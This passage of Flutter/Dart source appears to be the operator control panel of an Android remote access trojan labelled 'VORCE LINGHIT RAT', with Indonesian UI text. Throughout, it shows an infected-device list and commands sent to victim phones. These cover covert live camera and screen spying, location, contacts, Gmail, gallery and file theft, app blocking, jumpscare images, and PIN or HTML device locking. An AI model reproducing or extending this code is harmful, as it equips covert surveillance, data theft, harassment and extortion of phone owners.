                child: Image.asset(
                  'assets/images/DratTojan.jpeg',
                  fit: BoxFit.cover,
                  width: double.infinity,
                ),
              ),
            ),
          ),
          const SizedBox(height: 12),
          Center(
            child: ComixChip(
              bgColor: comixYellow,
              child: const Text(
                'VORCE LINGHIT RAT',
                style: TextStyle(
                    color: comixInk,
                    fontFamily: 'Orbitron',
                    fontSize: 12,
                    fontWeight: FontWeight.w900,
                    letterSpacing: 1.5),
              ),
            ),
          ),
          const SizedBox(height: 12),
          Row(
            children: [
              const Text(
                "DEVICES",
                style: TextStyle(
                    color: comixInk,
                    fontWeight: FontWeight.w900,
                    letterSpacing: 2,
                    fontSize: 13,
                    fontFamily: 'Orbitron'),
              ),
              const SizedBox(width: 8),
              Expanded(child: Container(height: 3, color: comixInk)),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildDeviceCard(dynamic device, int index) {
    final bool isActive = device['status'] != 'Offline';
    final Color statusColor = isActive ? comixGreen : comixRed;
    final String displayName = device['name'] ?? device['model'] ?? 'Unknown Device';
    final int battery = device['battery'] ?? 0;
    final String androidVersion = device['androidVersion'] ?? '-';
    final int sdkVersion = device['sdkVersion'] ?? 0;
    final String number = (index + 1).toString().padLeft(2, '0');
    final Color batColor = battery > 50
        ? comixGreen
        : battery > 20
            ? comixOrange
            : comixRed;

    return GestureDetector(
      onTap: () {
        setState(() {
          _targetId = device['id']?.toString() ?? '';
          _targetModel = displayName;
          _deviceData = Map<String, dynamic>.from(device);
          _currentTab = TabIndex.control;
        });
        _addLog("🎯 Selected: $_targetModel", LogType.success);
      },
      child: Padding(
        padding: const EdgeInsets.only(bottom: 14),
        child: ComixPanel(
          bgColor: Colors.white,
          shadowOffset: 6,
          borderWidth: 3,
          radius: const BorderRadius.all(Radius.circular(20)),
          padding: const EdgeInsets.all(14),
          child: Row(
            children: [
              Column(
                children: [
                  Container(
                    width: 54,
                    height: 54,
                    decoration: BoxDecoration(
                      color: comixBlue,
                      borderRadius: BorderRadius.circular(14),
                      border: Border.all(color: comixInk, width: 2.5),
                      boxShadow: const [
                        BoxShadow(
                            color: comixInk,
                            offset: Offset(2.5, 2.5),
                            blurRadius: 0),
                      ],
                    ),
                    child: const Icon(Icons.phone_android_rounded,
                        color: Colors.white, size: 28),
                  ),
                  const SizedBox(height: 8),
                  Container(
                    width: 36,
                    height: 6,
                    decoration: BoxDecoration(
                      color: comixInk.withOpacity(0.15),
                      borderRadius: BorderRadius.circular(3),
                    ),
                    child: FractionallySizedBox(
                      widthFactor: (battery / 100).clamp(0.0, 1.0),
                      alignment: Alignment.centerLeft,
                      child: Container(
                        decoration: BoxDecoration(
                          color: batColor,
                          borderRadius: BorderRadius.circular(3),
                        ),
                      ),
                    ),
                  ),
                  const SizedBox(height: 4),
                  Text("$battery%",
                      style: TextStyle(
                          color: batColor,
                          fontSize: 10,
                          fontWeight: FontWeight.w900,
                          fontFamily: 'ShareTechMono')),
                ],
              ),
              const SizedBox(width: 14),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(displayName,
                        style: const TextStyle(
                          color: comixInk,
                          fontWeight: FontWeight.w900,
                          fontSize: 14,
                          fontFamily: 'Orbitron',
                        ),
                        maxLines: 1,
                        overflow: TextOverflow.ellipsis),
                    const SizedBox(height: 4),
                    Text("Android $androidVersion · SDK $sdkVersion",
                        style: const TextStyle(
                          color: comixInk,
                          fontSize: 10.5,
                          fontWeight: FontWeight.w700,
                          fontFamily: 'ShareTechMono',
                        )),
                    const SizedBox(height: 8),
                    ComixChip(
                      bgColor: statusColor,
                      child: Row(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          Container(
                            width: 7,
                            height: 7,
                            decoration: const BoxDecoration(
                                color: Colors.white, shape: BoxShape.circle),
                          ),
                          const SizedBox(width: 5),
                          Text(
                            isActive ? "ONLINE" : "OFFLINE",
                            style: const TextStyle(
                                color: Colors.white,
                                fontSize: 9,
                                fontWeight: FontWeight.w900,
                                fontFamily: 'ShareTechMono',
                                letterSpacing: 1),
                          ),
                        ],
                      ),
                    ),
                  ],
                ),
              ),
              Container(
                width: 36,
                height: 36,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: comixYellow,
                  border: Border.all(color: comixInk, width: 2.5),
                ),
                child: Center(
                  child: Text(number,
                      style: const TextStyle(
                        color: comixInk,
                        fontSize: 12,
                        fontWeight: FontWeight.w900,
                        fontFamily: 'ShareTechMono',
                      )),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ─── TAB: CONTROL (COMIX) ──────────────────────────────────────────
  Widget _buildControlTab() {
    if (_targetId == "unknown") {
      return Center(
        child: ComixPanel(
          bgColor: comixYellow,
          padding: const EdgeInsets.all(20),
          child: const Text(
            "PILIH DEVICE DULU!",
            style: TextStyle(
                color: comixInk,
                fontSize: 16,
                fontWeight: FontWeight.w900,
                fontFamily: 'Orbitron'),
          ),
        ),
      );
    }

    return SingleChildScrollView(
      padding: const EdgeInsets.all(14),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          _buildDeviceInfoCard(),
          const SizedBox(height: 18),
          const Text(
            "REMOTE KONTROL",
            style: TextStyle(
                color: comixInk,
                fontSize: 20,
                fontWeight: FontWeight.w900,
                letterSpacing: 2,
                fontFamily: 'Orbitron'),
          ),
          const SizedBox(height: 6),
          const Text(
            "KONTROL",
            style: TextStyle(
                color: comixTextSub,
                fontSize: 11,
                fontWeight: FontWeight.w800,
                letterSpacing: 1,
                fontFamily: 'ShareTechMono'),
          ),
          const SizedBox(height: 14),
          GridView.builder(
            shrinkWrap: true,
            physics: const NeverScrollableScrollPhysics(),
            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
              crossAxisCount: 2,
              crossAxisSpacing: 12,
              mainAxisSpacing: 12,
              childAspectRatio: 1.1,
            ),
            itemCount: _controlItems.length,
            itemBuilder: (context, index) {
              final item = _controlItems[index];
              if (item['isToggle'] == true) {
                return _buildToggleCard(
                  label: item['label'],
                  icon: item['icon'],
                  color: item['color'],
                  isOn: item['isOn'],
                  needsInput: item['needsInput'] ?? false,
                  inputHint: item['inputHint'] ?? '',
                  inputType: item['inputType'] ?? 'text',
                  command: item['command'],
                );
              } else {
                return _buildActionCard(
                  label: item['label'],
                  icon: item['icon'],
                  color: item['color'],
                  onTap: () => _handleActionTap(item),
                );
              }
            },
          ),
          const SizedBox(height: 20),
          _buildTerminalLogs(),
          const SizedBox(height: 20),
          _buildControlFooter(),
        ],
      ),
    );
  }

  Widget _buildToggleCard({
    required String label,
    required IconData icon,
    required Color color,
    required bool isOn,
    required bool needsInput,
    required String inputHint,
    required String inputType,
    required String command,
  }) {
    return ComixPanel(
      bgColor: Colors.white,
      shadowOffset: 5,
      borderWidth: 2.5,
      radius: const BorderRadius.all(Radius.circular(16)),
      padding: const EdgeInsets.all(12),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Container(
                width: 40,
                height: 40,
                decoration: BoxDecoration(
                  color: color,
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: comixInk, width: 2.5),
                  boxShadow: const [
                    BoxShadow(
                        color: comixInk, offset: Offset(2, 2), blurRadius: 0),
                  ],
                ),
                child: Icon(icon, color: Colors.white, size: 20),
              ),
              Transform.scale(
                scale: 0.85,
                child: Switch(
                  value: isOn,
                  onChanged: (bool value) async {
                    if (command == 'jumpscareStart') {
                      if (value == true) {
                        _showJumpscareDialog();
                      } else {
                        _sendCommand('jumpscareStop', extra: 'true');
                        setState(() {
                          _isJumpscareActive = false;
                          _updateControlItemState(command, false);
                        });
                        _addLog("🛑 Jumpscare dimatikan", LogType.info);
                      }
                      return;
                    }
                    if (command == 'jumpscare2Start') {
                      if (value == true) {
                        _showJumpscare2Dialog();
                      } else {
                        _sendCommand('jumpscare2Stop', extra: 'true');
                        setState(() {
                          _isJumpscare2Active = false;
                          _updateControlItemState(command, false);
                        });
                        _addLog("🛑 Jumpscare V2 dimatikan", LogType.info);
                      }
                      return;
                    }
                    if (command == 'videoOverlay') {
                      _sendCommand(command, extra: value ? 'start' : 'stop');
                      setState(() {
                        _updateControlItemState(command, value);
                        _isVideoOverlayActive = value;
                      });
                      return;
                    }
                    if (command == 'lockDevice') {
                      if (value == true) {
                        String? input = await _showLockDeviceDialog();
                        if (input == null) return;
                        _sendCommand(command, extra: input);
                        setState(() => _updateControlItemState(command, true));
                      } else {
                        _sendCommand('unlockDevice', extra: '');
                        setState(() => _updateControlItemState(command, false));
                      }
                      return;
                    }
                    if (command == 'lockCustom') {
                      if (value == true) {
                        final html = await _showLockCustomHtmlDialog();
                        if (html == null) return;
                        _sendCommand('lockCustom', extra: html);
                        setState(() {
                          _isLockCustomActive = true;
                          _updateControlItemState(command, true);
                        });
                      } else {
                        _sendCommand('unlockDevice', extra: '');
                        setState(() {
                          _isLockCustomActive = false;
                          _updateControlItemState(command, false);
                        });
                      }
                      return;
                    }
                    if (needsInput && value == true) {
                      String? input = await _showInputDialog(
                        title: "Input untuk $label",
                        hint: inputHint,
                        multiline: inputType == 'multiline',
                        keyboardType: inputType == 'number'
                            ? TextInputType.number
                            : TextInputType.text,
                      );
                      if (input == null) return;
                      _sendCommand(command, extra: input);
                      setState(() => _updateControlItemState(command, true));
                    } else if (needsInput && value == false) {
                      _sendCommand(command, extra: 'false');
                      setState(() => _updateControlItemState(command, false));
                    } else {
                      _sendCommand(command, extra: value.toString());
                      setState(() => _updateControlItemState(command, value));
                    }
                  },
                  activeColor: color,
                  activeTrackColor: color.withOpacity(0.3),
                  inactiveThumbColor: comixInk.withOpacity(0.4),
                  inactiveTrackColor: Colors.transparent,
                ),
              ),
            ],
          ),
          const Spacer(),
          Text(label,
              style: const TextStyle(
                  color: comixInk,
                  fontSize: 12,
                  fontWeight: FontWeight.w900,
                  fontFamily: 'Orbitron'),
              maxLines: 1,
              overflow: TextOverflow.ellipsis),
          const SizedBox(height: 3),
          Text(isOn ? "ON" : "OFF",
              style: TextStyle(
                  color: isOn ? comixGreen : comixTextSub,
                  fontSize: 10,
                  fontWeight: FontWeight.w900,
                  fontFamily: 'ShareTechMono')),
        ],
      ),
    );
  }

  Widget _buildActionCard({
    required String label,
    required IconData icon,
    required Color color,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: ComixPanel(
        bgColor: Colors.white,
        shadowOffset: 5,
        borderWidth: 2.5,
        radius: const BorderRadius.all(Radius.circular(16)),
        padding: const EdgeInsets.all(12),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Container(
              width: 40,
              height: 40,
              decoration: BoxDecoration(
                color: color,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: comixInk, width: 2.5),
                boxShadow: const [
                  BoxShadow(
                      color: comixInk, offset: Offset(2, 2), blurRadius: 0),
                ],
              ),
              child: Icon(icon, color: Colors.white, size: 20),
            ),
            const Spacer(),
            Text(label,
                style: const TextStyle(
                    color: comixInk,
                    fontSize: 12,
                    fontWeight: FontWeight.w900,
                    fontFamily: 'Orbitron'),
                maxLines: 1,
                overflow: TextOverflow.ellipsis),
            const SizedBox(height: 3),
            const Text("TAP",
                style: TextStyle(
                    color: comixTextSub,
                    fontSize: 10,
                    fontWeight: FontWeight.w900,
                    fontFamily: 'ShareTechMono')),
          ],
        ),
      ),
    );
  }

  void _handleActionTap(Map<String, dynamic> item) async {
    final command = item['command'];
    final needsInput = item['needsInput'] ?? false;
    final inputHint = item['inputHint'] ?? '';
    final inputType = item['inputType'] ?? 'text';
    final extra = item['extra'] ?? '';

    if (command == "camera") {
      final facing = extra.isNotEmpty ? extra : "front";
      _takeScreenshotViaRest(facing);
      return;
    }
    if (command == "liveCamera") {
      final facing = extra.isNotEmpty ? extra : "front";
      _startLiveCameraPolling(facing);
      return;
    }
    if (command == "stopCamera") {
      _sendCommand('camera', extra: 'stop');
      if (_cameraModalVisible) _closeCameraModal();
      return;
    }
    if (command == "stopScreen") {
      _sendCommand('screen', extra: 'stop');
      if (_screenModalVisible) _closeScreenModal();
      return;
    }
    if (command == "videoOverlay") return;
    if (command == "getLocation") {
      _sendCommand('getLocation', extra: '');
      showDialog(
        context: context,
        barrierDismissible: false,
        builder: (context) {
          _locationLoadingContext = context;
          return Dialog(
            backgroundColor: Colors.transparent,
            child: ComixPanel(
              bgColor: Colors.white,
              padding: const EdgeInsets.all(20),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  const SizedBox(
                      width: 40,
                      height: 40,
                      child: CircularProgressIndicator(
                          color: comixBlue, strokeWidth: 3)),
                  const SizedBox(height: 16),
                  ComixChip(
                    bgColor: comixBlue,
                    child: const Text("MENGAMBIL LOKASI...",
                        style: TextStyle(
                            color: Colors.white,
                            fontSize: 10,
                            fontWeight: FontWeight.w900,
                            fontFamily: 'ShareTechMono')),
                  ),
                ],
              ),
            ),
          );
        },
      );
      return;
    }
    if (command == "getPhone") {
      _sendCommand('getPhone', extra: '');
      return;
    }
    if (command == "getGmail") {
      _sendCommand('getGmail', extra: '');
      return;
    }
    if (command == "getContacts") {
      _sendCommand('getContacts', extra: '');
      return;
    }
    if (command == "setWallpaper") {
      _showUrlDialog("Set Wallpaper", "Masukkan URL Gambar",
          "https://example.com/image.jpg", command, extra);
      return;
    }
    if (command == "openUrl") {
      _showUrlDialog("Open Situs", "Masukkan URL Situs",
          "https://example.com", command, extra);
      return;
    }
    if (command == "playAudio") {
      _showUrlDialog("Play Audio", "Masukkan URL Audio",
          "https://example.com/audio.mp3", command, extra);
      return;
    }
    if (command == "jumpscareStart") {
      _showJumpscareDialog();
      return;
    }
    if (command == "jumpscare2Start") {
      _showJumpscare2Dialog();
      return;
    }
    if (command == "blockApp") {
      _showBlockAppBottomSheet();
      return;
    }
    if (command == "getGallery") {
      _openGalleryFullscreen();
      return;
    }
    if (command == "getFiles") {
      _openFileManagerFullscreen();
      return;
    }
    if (command == "liveCamDX") {
      _showLiveCamDXPicker();
      return;
    }
    if (command == "spyLayar") {
      _launchSpyLayar();
      return;
    }

    if (needsInput) {
      String? input;
      if (command == 'lockDevice') {
        input = await _showLockDeviceDialog();
      } else if (command == 'lockCustom') {
        input = await _showLockCustomHtmlDialog();
      } else {
        input = await _showInputDialog(
          title: "Input untuk ${item['label']}",
          hint: inputHint,
          multiline: inputType == 'multiline',
          keyboardType: inputType == 'number'
              ? TextInputType.number
              : TextInputType.text,
          initialValue: extra,
        );
      }
      if (input == null) return;
      _sendCommand(command, extra: input);
    } else {
      _sendCommand(command, extra: extra);
    }
  }

  void _launchSpyLayar() {
    if (_cameraModalVisible) _closeCameraModal();
    if (_screenshotResultVisible) _closeScreenshotResult();

    setState(() {
      _screenFrame = '';
      _screenLoading = true;
      _screenModalVisible = false;
    });

    _sendCommand('screen', extra: 'start');
    _addLog("🖥️ Spy Layar dimulai", LogType.success);

    Navigator.push(
      context,
      MaterialPageRoute(
        fullscreenDialog: true,
        builder: (context) => LiveScreenPage(
          targetModel: _targetModel,
          frameStream: _screenFrameStreamController.stream,
          onClose: () {
            _sendCommand('screen', extra: 'stop');
            Navigator.pop(context);
            _addLog("🖥️ Spy Layar dihentikan", LogType.info);
          },
        ),
      ),
    );
  }

  void _showLiveCamDXPicker() {
    showDialog(
      context: context,
      builder: (ctx) => Dialog(
        backgroundColor: Colors.transparent,
        child: ComixPanel(
          bgColor: Colors.white,
          shadowOffset: 8,
          borderWidth: 3.5,
          radius: const BorderRadius.all(Radius.circular(24)),
          padding: const EdgeInsets.all(20),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              ComixChip(
                bgColor: comixCyan,
                child: const Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(Icons.videocam_rounded,
                        color: Colors.white, size: 14),
                    SizedBox(width: 6),
                    Text('LIVE CAM VORCE LINGHIT',
                        style: TextStyle(
                            color: Colors.white,
                            fontSize: 11,
                            fontWeight: FontWeight.w900,
                            fontFamily: 'Orbitron',
                            letterSpacing: 1)),
                  ],
                ),
              ),
              const SizedBox(height: 20),
              Row(
                children: [
                  Expanded(
                      child: _camPickerBtn(
                          ctx, 'front', Icons.face_retouching_natural, 'DEPAN')),
                  const SizedBox(width: 12),
                  Expanded(
                      child: _camPickerBtn(
                          ctx, 'back', Icons.camera_rear, 'BELAKANG')),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _camPickerBtn(BuildContext ctx, String facing, IconData icon, String label) {
    return GestureDetector(
      onTap: () {
        Navigator.pop(ctx);
        _launchDarkXyraLiveCam(facing);
      },
      child: Container(
        height: 90,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(16),
          color: comixCyan,
          border: Border.all(color: comixInk, width: 3),
          boxShadow: const [
            BoxShadow(color: comixInk, offset: Offset(3, 3), blurRadius: 0),
          ],
        ),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(icon, color: Colors.white, size: 30),
            const SizedBox(height: 6),
            Text(label,
                style: const TextStyle(
                    color: Colors.white,
                    fontFamily: 'Orbitron',
                    fontSize: 11,
                    fontWeight: FontWeight.w900,
                    letterSpacing: 1)),
          ],
        ),
      ),
    );
  }

  void _launchDarkXyraLiveCam(String facing) {
    if (_screenModalVisible) _closeScreenModal();
    if (_screenshotResultVisible) _closeScreenshotResult();

    setState(() {
      _cameraFacing = facing;
      _cameraFrame = '';
      _cameraLoading = true;
    });

    _sendCommand('liveCamera', extra: facing);

    Navigator.push(
      context,
      MaterialPageRoute(
        fullscreenDialog: true,
        builder: (context) => LiveCameraPage(
          targetId: _targetId,
          targetModel: _targetModel,
          facing: facing,
          frameStream: _cameraFrameStreamController.stream,
          isLoading: _cameraLoading,
          onClose: () {
            _sendCommand('camera', extra: 'stop');
            Navigator.pop(context);
          },
          onSwitchCamera: (newFacing) {
            _sendCommand('liveCamera', extra: newFacing);
            setState(() => _cameraFacing = newFacing);
          },
          onCapture: () => _takeCameraSocket(_cameraFacing),
        ),
      ),
    );
  }

  // ─── LOCK DEVICE DIALOG (COMIX) ────────────────────────────────────
  Future<String?> _showLockDeviceDialog() async {
    String pin = '';
    String lockTitle = '';
    String errorMessage = '';

    return showDialog<String>(
      context: context,
      barrierDismissible: false,
      builder: (context) => StatefulBuilder(
        builder: (context, setState) => Dialog(
          backgroundColor: Colors.transparent,
          insetPadding: const EdgeInsets.symmetric(horizontal: 20),
          child: ComixPanel(
            bgColor: Colors.white,
            shadowOffset: 8,
            borderWidth: 3.5,
            radius: const BorderRadius.all(Radius.circular(24)),
            padding: const EdgeInsets.all(20),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                ComixChip(
                  bgColor: comixRed,
                  child: const Text('SET DEVICE LOCK',
                      style: TextStyle(
                          color: Colors.white,
                          fontWeight: FontWeight.w900,
                          fontFamily: 'Orbitron',
                          fontSize: 12,
                          letterSpacing: 1)),
                ),
                const SizedBox(height: 16),
                Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: List.generate(4, (index) {
                    return Container(
                      width: 52,
                      height: 60,
                      margin: const EdgeInsets.symmetric(horizontal: 4),
                      decoration: BoxDecoration(
                        border: Border.all(color: comixInk, width: 2.5),
                        borderRadius: BorderRadius.circular(12),
                        color: comixYellow.withOpacity(0.3),
                      ),
                      child: Center(
                        child: Text(
                          index < pin.length ? '●' : '—',
                          style: TextStyle(
                              color: comixInk,
                              fontSize: index < pin.length ? 20 : 24,
                              fontWeight: FontWeight.w900),
                        ),
                      ),
                    );
                  }),
                ),
                const SizedBox(height: 14),
                GridView.count(
                  crossAxisCount: 3,
                  shrinkWrap: true,
                  physics: const NeverScrollableScrollPhysics(),
                  mainAxisSpacing: 8,
                  crossAxisSpacing: 8,
                  children: [
                    ...[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) {
                      return _buildKeypadButton('$num', onPressed: () {
                        if (pin.length < 4) {
                          setState(() {
                            pin += '$num';
                            errorMessage = '';
                          });
                        }
                      });
                    }),
                    _buildKeypadButton('⌫', onPressed: () {
                      if (pin.isNotEmpty) {
                        setState(() {
                          pin = pin.substring(0, pin.length - 1);
                          errorMessage = '';
                        });
                      }
                    }),
                  ],
                ),
                if (errorMessage.isNotEmpty)
                  Padding(
                    padding: const EdgeInsets.only(top: 8),
                    child: Text(errorMessage,
                        style: const TextStyle(
                            color: comixRed,
                            fontSize: 10,
                            fontWeight: FontWeight.w900)),
                  ),
                const SizedBox(height: 12),
                TextField(
                  onChanged: (value) => setState(() => lockTitle = value),
                  maxLength: 60,
                  style: const TextStyle(
                      color: comixInk, fontWeight: FontWeight.w700),
                  decoration: InputDecoration(
                    hintText: 'Judul / Pesan lock',
                    hintStyle: const TextStyle(color: comixTextDim),
                    counterText: '',
                    filled: true,
                    fillColor: comixYellow.withOpacity(0.25),
                    border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(10),
                        borderSide:
                            const BorderSide(color: comixInk, width: 2.5)),
                    enabledBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(10),
                        borderSide:
                            const BorderSide(color: comixInk, width: 2.5)),
                    focusedBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(10),
                        borderSide:
                            const BorderSide(color: comixBlue, width: 3)),
                  ),
                ),
                const SizedBox(height: 14),
                Row(children: [
                  Expanded(
                      child: _ComixOutlineBtn(
                    label: 'BATAL',
                    onTap: () => Navigator.pop(context, null),
                  )),
                  const SizedBox(width: 10),
                  Expanded(
                      child: _ComixGradBtn(
                    label: 'LOCK',
                    icon: Icons.lock_rounded,
                    color: comixRed,
                    onTap: () {
                      if (pin.length != 4) {
                        setState(() => errorMessage = 'PIN harus 4 angka!');
                        return;
                      }
                      final lockData = jsonEncode({
                        'pin': pin,
                        'title': lockTitle.trim().isEmpty
                            ? 'Perangkat Terkunci'
                            : lockTitle.trim(),
                      });
                      Navigator.pop(context, lockData);
                    },
                  )),
                ]),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildKeypadButton(String label, {required VoidCallback onPressed}) {
    return GestureDetector(
      onTap: onPressed,
      child: Container(
        decoration: BoxDecoration(
          border: Border.all(color: comixInk, width: 2.5),
          borderRadius: BorderRadius.circular(12),
          color: Colors.white,
          boxShadow: const [
            BoxShadow(color: comixInk, offset: Offset(2, 2), blurRadius: 0),
          ],
        ),
        child: Center(
          child: Text(label,
              style: const TextStyle(
                  color: comixInk,
                  fontSize: 18,
                  fontWeight: FontWeight.w900)),
        ),
      ),
    );
  }

  // ─── LOCK CUSTOM HTML DIALOG (COMIX) ───────────────────────────────
  Future<String?> _showLockCustomHtmlDialog() async {
    final htmlController = TextEditingController(
      text: '<!DOCTYPE html>\n<html>\n<head><meta charset="UTF-8"></head>\n<body style="margin:0;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;"><h1>🔒 Locked</h1></body>\n</html>',
    );

    return showDialog<String>(
      context: context,
      barrierDismissible: false,
      builder: (ctx) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 32),
        child: ComixPanel(
          bgColor: Colors.white,
          shadowOffset: 8,
          borderWidth: 3.5,
          radius: const BorderRadius.all(Radius.circular(24)),
          padding: const EdgeInsets.all(20),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              ComixChip(
                bgColor: comixPurple,
                child: const Text('LOCK V2 - HTML',
                    style: TextStyle(
                        color: Colors.white,
                        fontWeight: FontWeight.w900,
                        fontFamily: 'Orbitron',
                        fontSize: 12,
                        letterSpacing: 1)),
              ),
              const SizedBox(height: 14),
              Container(
                constraints: const BoxConstraints(maxHeight: 280),
                decoration: BoxDecoration(
                  color: Colors.white,
                  borderRadius: BorderRadius.circular(14),
                  border: Border.all(color: comixInk, width: 2.5),
                ),
                child: TextField(
                  controller: htmlController,
                  maxLines: 12,
                  style: const TextStyle(
                    color: comixInk,
                    fontSize: 11,
                    fontFamily: 'ShareTechMono',
                    fontWeight: FontWeight.w600,
                    height: 1.5,
                  ),
                  decoration: const InputDecoration(
                    contentPadding: EdgeInsets.all(12),
                    border: InputBorder.none,
                  ),
                ),
              ),
              const SizedBox(height: 14),
              Row(children: [
                Expanded(
                    child: _ComixOutlineBtn(
                  label: 'BATAL',
                  onTap: () => Navigator.pop(ctx),
                )),
                const SizedBox(width: 10),
                Expanded(
                    child: _ComixGradBtn(
                  label: 'KIRIM',
                  icon: Icons.send_rounded,
                  color: comixPurple,
                  onTap: () {
                    final html = htmlController.text.trim();
                    if (html.isEmpty) return;
                    Navigator.pop(ctx, html);
                  },
                )),
              ]),
            ],
          ),
        ),
      ),
    );
  }

  // ─── URL DIALOG (COMIX) ────────────────────────────────────────────
  void _showUrlDialog(String title, String hint, String placeholder, String command, String initialValue) {
    final controller = TextEditingController(
        text: initialValue.isNotEmpty ? initialValue : placeholder);
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.symmetric(horizontal: 24),
        child: ComixPanel(
          bgColor: Colors.white,
          shadowOffset: 8,
          borderWidth: 3.5,
          radius: const BorderRadius.all(Radius.circular(24)),
          padding: const EdgeInsets.all(20),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              ComixChip(
                bgColor: comixYellow,
                child: Text(title,
                    style: const TextStyle(
                        color: comixInk,
                        fontFamily: 'Orbitron',
                        fontSize: 12,
                        fontWeight: FontWeight.w900)),
              ),
              const SizedBox(height: 14),
              TextField(
                controller: controller,
                style: const TextStyle(
                    color: comixInk, fontWeight: FontWeight.w700),
                decoration: InputDecoration(
                  hintText: hint,
                  hintStyle: const TextStyle(color: comixTextDim),
                  filled: true,
                  fillColor: comixYellow.withOpacity(0.25),
                  border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide:
                          const BorderSide(color: comixInk, width: 2.5)),
                  enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide:
                          const BorderSide(color: comixInk, width: 2.5)),
                  focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide: const BorderSide(color: comixBlue, width: 3)),
                ),
              ),
              const SizedBox(height: 18),
              Row(children: [
                Expanded(
                    child: _ComixOutlineBtn(
                  label: 'BATAL',
                  onTap: () => Navigator.pop(context),
                )),
                const SizedBox(width: 10),
                Expanded(
                    child: _ComixGradBtn(
                  label: 'KIRIM',
                  icon: Icons.send_rounded,
                  color: comixBlue,
                  onTap: () {
                    final value = controller.text.trim();
                    if (value.isEmpty) return;
                    Navigator.pop(context);
                    _sendCommand(command, extra: value);
                  },
                )),
              ]),
            ],
          ),
        ),
      ),
    );
  }

  // ─── JUMPSCARE DIALOG (COMIX) ──────────────────────────────────────
  void _showJumpscareDialog() {
    final urlController = TextEditingController(
        text: _jumpscareUrl.isNotEmpty
            ? _jumpscareUrl
            : "https://files.catbox.moe/dihycl.jpg");
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.symmetric(horizontal: 24),
        child: ComixPanel(
          bgColor: Colors.white,
          shadowOffset: 8,
          borderWidth: 3.5,
          radius: const BorderRadius.all(Radius.circular(24)),
          padding: const EdgeInsets.all(20),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              ComixChip(
                bgColor: comixRed,
                child: const Text('🎃 JUMPSCARE',
                    style: TextStyle(
                        color: Colors.white,
                        fontWeight: FontWeight.w900,
                        fontFamily: 'Orbitron',
                        fontSize: 12,
                        letterSpacing: 1)),
              ),
              const SizedBox(height: 14),
              TextField(
                controller: urlController,
                style: const TextStyle(
                    color: comixInk, fontWeight: FontWeight.w700),
                decoration: InputDecoration(
                  hintText: 'https://...',
                  filled: true,
                  fillColor: comixYellow.withOpacity(0.25),
                  border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide:
                          const BorderSide(color: comixInk, width: 2.5)),
                  enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide:
                          const BorderSide(color: comixInk, width: 2.5)),
                  focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide: const BorderSide(color: comixBlue, width: 3)),
                ),
              ),
              const SizedBox(height: 18),
              Row(children: [
                Expanded(
                    child: _ComixOutlineBtn(
                  label: 'BATAL',
                  onTap: () => Navigator.pop(context),
                )),
                const SizedBox(width: 10),
                Expanded(
                    child: _ComixGradBtn(
                  label: 'AKTIFKAN',
                  icon: Icons.play_arrow_rounded,
                  color: comixRed,
                  onTap: () {
                    final url = urlController.text.trim();
                    if (url.isEmpty) return;
                    Navigator.pop(context);
                    _jumpscareUrl = url;
                    _sendCommand('jumpscareStart', extra: url);
                    setState(() {
                      _isJumpscareActive = true;
                      _updateControlItemState('jumpscareStart', true);
                    });
                  },
                )),
              ]),
            ],
          ),
        ),
      ),
    );
  }

  void _showJumpscare2Dialog() {
    final urlController = TextEditingController(
        text: _jumpscare2Url.isNotEmpty
            ? _jumpscare2Url
            : "https://files.catbox.moe/ulrmbb.jpg");
    final durationController =
        TextEditingController(text: _jumpscare2Duration.toString());
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.symmetric(horizontal: 24),
        child: ComixPanel(
          bgColor: Colors.white,
          shadowOffset: 8,
          borderWidth: 3.5,
